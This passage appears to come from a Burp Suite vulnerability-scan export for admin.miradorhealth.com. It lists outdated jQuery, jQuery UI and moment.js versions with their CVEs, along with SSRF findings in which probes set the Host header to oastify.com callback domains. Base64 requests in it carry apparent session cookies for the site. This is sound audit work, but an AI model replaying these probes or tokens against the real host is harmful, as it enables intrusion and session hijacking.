    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed 2 vulnerable JavaScript libraries.</p>
<p>We detected <strong>jquery-ui</strong> version <strong>1.11.4</strong>, which has the following vulnerabilities:</p>
<ul>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41182">CVE-2021-41182</a>: XSS in the `altField` option of the Datepicker widget<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41184">CVE-2021-41184</a>: XSS in the `of` option of the `.position()` util<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41183">CVE-2021-41183</a>: XSS Vulnerability on text options of jQuery UI datepicker<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31160">CVE-2022-31160</a>: XSS when refreshing a checkboxradio with an HTML-like initial text label <br>
</li>
</ul><br>
<p>We also detected <strong>jquery-ui-dialog</strong> version <strong>1.11.4</strong>, which has the following vulnerability:</p>
<ul>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2016-7103">CVE-2016-7103</a>: XSS Vulnerability on closeText option<br>
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[jquery-ui>.1.11.4]]></issueDetailItem>
      <issueDetailItem><![CDATA[jquery-ui-dialog>.1.11.4]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9qcXVlcnktdWkubWluLmpzIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBBV1NBTEI9T0JZQXdWN21uekp4UDZNS2NHUldkMm1EbEFaZDR4VWsyOXhOY0NmY0ZoR1dsbXk1ZkZ4Z1lwcDZSNmRHeVJQZUpzTDFyRFZBZWdQWXJCOG44eER2WFBHcFZLTWZzSEtDSFJiaWZON2ZLZndsTjAybE5GVjZpaDZHbGVFaDsgQVdTQUxCQ09SUz1PQllBd1Y3bW56SnhQNk1LY0dSV2QybURsQVpkNHhVazI5eE5jQ2ZjRmhHV2xteTVmRnhnWXBwNlI2ZEd5UlBlSnNMMXJEVkFlZ1BZckI4bjh4RHZYUEdwVktNZnNIS0NIUmJpZk43Zktmd2xOMDJsTkZWNmloNkdsZUVoDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClNlYy1DaC1VYTogIkNocm9taXVtIjt2PSIxMzEiLCAiTm90X0EgQnJhbmQiO3Y9IjI0Ig0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLU1vYmlsZTogPzANCkFjY2VwdDogKi8qDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBuby1jb3JzDQpTZWMtRmV0Y2gtRGVzdDogc2NyaXB0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0yDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1523641882994879488</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery-ui.min.js]]></path>
    <location><![CDATA[/js/jquery-ui.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>4tyjz5kkf1mf7zgccj8cxbxeo5uziybm4lsbf13q.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDR0eWp6NWtrZjFtZjd6Z2NjajhjeGJ4ZW81dXppeWJtNGxzYmYxM3Eub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>67.205.148.18</originIp>
      <time>2024-Dec-15 01:02:12.879 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>4tyjz5kkf1mf7zgccj8cxbxeo5uziybm4lsbf13q.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8136387224899798016</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery-ui.min.js]]></path>
    <location><![CDATA[/js/jquery-ui.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>4tyjz5kkf1mf7zgccj8cxbxeo5uziybm4lsbf13q.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDR0eWp6NWtrZjFtZjd6Z2NjajhjeGJ4ZW81dXppeWJtNGxzYmYxM3Eub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 01:02:13.509 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDR0eWp6NWtrZjFtZjd6Z2NjajhjeGJ4ZW81dXppeWJtNGxzYmYxM3Eub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncmxnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4957836268588102656</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery.min.js]]></path>
    <location><![CDATA[/js/jquery.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed a vulnerable JavaScript library.</p>
<p>We detected <strong>jquery</strong> version <strong>1.12.4</strong>, which has the following vulnerabilities:</p>
<ul>
<li>
jQuery 1.x and 2.x are End-of-Life and no longer receiving security updates<br>
<a href="https://github.com/jquery/jquery.com/issues/162">https://github.com/jquery/jquery.com/issues/162</a><br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-9251">CVE-2015-9251</a>: 3rd party CORS request may execute<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11358">CVE-2019-11358</a>: jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11023">CVE-2020-11023</a>: passing HTML containing &lt;option&gt; elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code.<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11022">CVE-2020-11022</a>: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS<br>
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[jquery>.1.12.4]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9qcXVlcnkubWluLmpzIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBBV1NBTEI9dXdaY2MxOEpRdFhLdGNmMzVrRnNTR083bTJ4d2FaNHJtNElrNlJiVEhkVlJCVXVTT1hTQlc1dUZ1Y3gydDJIcExkY2VoN0hidGM0S0hmZEk5T0JpUTVXWlA1WU5PTWJIZnR2V2NXQWxWbkxYdDlXajBScVBXeXZtM3RhRTsgQVdTQUxCQ09SUz11d1pjYzE4SlF0WEt0Y2YzNWtGc1NHTzdtMnh3YVo0cm00SWs2UmJUSGRWUkJVdVNPWFNCVzV1RnVjeDJ0MkhwTGRjZWg3SGJ0YzRLSGZkSTlPQmlRNVdaUDVZTk9NYkhmdHZXY1dBbFZuTFh0OVdqMFJxUFd5dm0zdGFFDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClNlYy1DaC1VYTogIkNocm9taXVtIjt2PSIxMzEiLCAiTm90X0EgQnJhbmQiO3Y9IjI0Ig0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KU2VjLUNoLVVhLU1vYmlsZTogPzANCkFjY2VwdDogKi8qDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBuby1jb3JzDQpTZWMtRmV0Y2gtRGVzdDogc2NyaXB0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0yDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8580513167802304512</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery.min.js]]></path>
    <location><![CDATA[/js/jquery.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>g1iv7hswndurfbookvgo5n5qwh2bq9ixbwzmmca1.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGcxaXY3aHN3bmR1cmZib29rdmdvNW41cXdoMmJxOWl4Ynd6bW1jYTEub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:57:08.716 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>g1iv7hswndurfbookvgo5n5qwh2bq9ixbwzmmca1.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5623611744061168640</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery.min.js]]></path>
    <location><![CDATA[/js/jquery.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>g1iv7hswndurfbookvgo5n5qwh2bq9ixbwzmmca1.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGcxaXY3aHN3bmR1cmZib29rdmdvNW41cXdoMmJxOWl4Ynd6bW1jYTEub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:57:09.646 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGcxaXY3aHN3bmR1cmZib29rdmdvNW41cXdoMmJxOWl4Ynd6bW1jYTEub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncWtnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6950169876052526080</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/moment.min.js]]></path>
    <location><![CDATA[/js/moment.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed a vulnerable JavaScript library.</p>
<p>We detected <strong>moment.js</strong> version <strong>2.21.0</strong>, which has the following vulnerabilities:</p>
<ul>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24785">CVE-2022-24785</a>: This vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg fr is directly used to switch moment locale.<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31129">CVE-2022-31129</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22467">CVE-2023-22467</a>: Regular Expression Denial of Service (ReDoS), Affecting moment package, versions &gt;=2.18.0 &lt;2.29.4&lt;br&gt;
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[moment.js>.2.21.0]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
